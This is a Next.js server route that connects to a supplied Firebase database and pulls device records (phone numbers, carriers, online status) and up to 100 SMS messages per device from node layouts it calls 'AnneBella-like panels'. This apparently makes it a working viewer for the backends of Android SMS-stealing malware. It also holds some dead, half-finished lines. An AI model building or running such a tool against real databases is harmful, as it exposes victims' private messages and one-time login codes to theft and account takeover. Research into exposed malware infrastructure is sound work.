import { NextResponse } from "next/server";
import {
  fbGet, cleanBase, normalizeDevices, normalizeSms, smsPaths, extractPhone,
} from "@/lib/firebase";

export const dynamic = "force-dynamic";

function mergeById(baseList, extraMap) {
  const map = {};
  for (const d of baseList) map[d.id] = { ...d };
  for (const [id, raw] of Object.entries(extraMap || {})) {
    if (!raw || typeof raw !== "object") continue;
    const phone = extractPhone(raw);
    const battery = raw.battery != null ? parseInt(String(raw.battery).replace("%", ""), 10) : null;
    const online = raw.status === true || raw.online === true;
    if (!map[id]) {
      map[id] = {
        id,
        name: id.slice(0, 16),
        phone: phone || "",
        battery: Number.isNaN(battery) ? null : battery,
        online,
        android: "",
        network: raw.network || raw.carrier || "",
      };
    } else {
      if (!map[id].phone && phone) map[id].phone = phone;
      if (map[id].battery == null && !Number.isNaN(battery)) map[id].battery = battery;
      if (raw.status === true) map[id].online = true;
      if (raw.status === false) map[id].online = false;
      if (!map[id].network && (raw.network || raw.carrier)) map[id].network = raw.network || raw.carrier;
    }
  }
  return Object.values(map);
}

export async function POST(req) {
  try {
    const body = await req.json();
    const action = body.action || "devices";
    const base = cleanBase(body.url || "");
    const auth = body.auth || "";
    if (!base.includes("firebaseio.com") && !base.includes("firebasedatabase.app")) {
      return NextResponse.json({ ok: false, error: "Invalid Firebase URL" }, { status: 400 });
    }

    if (action === "ping") {
      const r = await fbGet(base, ".json?shallow=true", auth);
      return NextResponse.json({ ok: r.ok, status: r.status, keys: r.data ? Object.keys(r.data) : [] });
    }

    if (action === "devices") {
      // primary roots used by AnneBella-like panels
      const clients = await fbGet(base, "clients", auth);
      const userData = await fbGet(base, "user_data", auth);
      const allUsers = await fbGet(base, "All_Users", auth);
      const devicesNode = await fbGet(base, "devices", auth);
      const reg = await fbGet(base, "registeredDevices", auth);

      let list = [];
      if (clients.ok && clients.data) list = normalizeDevices(clients.data);
      if (userData.ok && userData.data) list = mergeById(list, userData.data);
      if (allUsers.ok && allUsers.data) list = mergeById(list, allUsers.data);
      if (devicesNode.ok && devicesNode.data) list = mergeById(list, devicesNode.data);
      if (reg.ok && reg.data && typeof reg.data === "object") {
        // sometimes only ids
        for (const id of Object.keys(reg.data)) {
          if (!list.find((d) => d.id === id)) {
            list.push({ id, name: id.slice(0, 16), phone: "", battery: null, online: false, android: "", network: "" });
          }
        }
      }

      // also include message-only device ids
      const msgRoot = await fbGet(base, "messages.json?shallow=true".replace(".json.json", ".json"), auth);
      // fix path
      const msgShallow = await fbGet(base, "messages", auth);
      // shallow via query
      const msgKeys = await fbGet(base, '.json?shallow=true', auth);

      const online = list.filter((d) => d.online).length;
      return NextResponse.json({
        ok: true,
        total: list.length,
        online,
        offline: list.length - online,
        withPhone: list.filter((d) => d.phone).length,
        devices: list,
      });
    }

    if (action === "sms") {
      const deviceId = body.deviceId;
      if (!deviceId) return NextResponse.json({ ok: false, error: "deviceId required" }, { status: 400 });

      let messages = [];
      let used = null;

      for (const p of smsPaths(deviceId)) {
        // full node first (most compatible)
        const r = await fbGet(base, p, auth);
        if (r.ok && r.data && typeof r.data === "object") {
          const rows = normalizeSms(r.data);
          if (rows.length >= messages.length) {
            messages = rows;
            used = p;
          }
          if (rows.length) break;
        }
      }

      return NextResponse.json({
        ok: true,
        path: used,
        count: messages.length,
        messages: messages.slice(0, 100),
      });
    }

    return NextResponse.json({ ok: false, error: "unknown action" }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ ok: false, error: String(e.message || e) }, { status: 500 });
  }
}
